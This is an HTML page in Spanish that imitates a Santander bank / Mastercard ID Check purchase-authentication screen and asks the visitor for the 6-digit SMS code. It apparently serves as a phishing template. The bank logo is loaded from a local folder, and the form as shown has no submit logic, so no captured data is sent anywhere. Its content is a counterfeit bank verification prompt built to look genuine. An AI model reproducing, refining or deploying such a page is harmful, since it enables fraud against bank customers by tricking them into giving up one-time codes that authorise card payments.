<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación de compra - Santander</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            border-top: 4px solid #E30613;
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 40px;
        }
        h5 {
            font-weight: bold;
            margin-bottom: 20px;
        }
        p, h6 {
            margin: 5px 0;
        }
        .form-control {
            margin-top: 10px;
            margin-bottom: 20px;
            padding: 10px;
            font-size: 1rem;
            border: 2px solid #005BBB;
            border-radius: 5px;
        }
        .btn-primary {
            background-color: #005BBB;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            width: 100%;
        }
        .link {
            display: block;
            margin-top: 20px;
            text-decoration: none;
            color: #005BBB;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/santander.png" alt="Santander">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/1920px-Mastercard_2019_logo.svg.png" alt="Mastercard ID Check" style="max-height: 30px;">
        </div>
        <h5>Autenticación de compra</h5>
        <p>Ingresa el código de 6 dígitos que recién enviamos vía SMS a tu teléfono celular</p>
        <h6>Comercio: Digital</h6>
        <h6>Número de tarjeta: ************</h6>

        <input type="text" class="form-control" placeholder="Digite el código">

        <button type="button" class="btn btn-primary">CONTINUAR</button>

        <a href="#" class="link">PRESIONE AQUÍ PARA RECIBIR UN NUEVO CÓDIGO</a>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
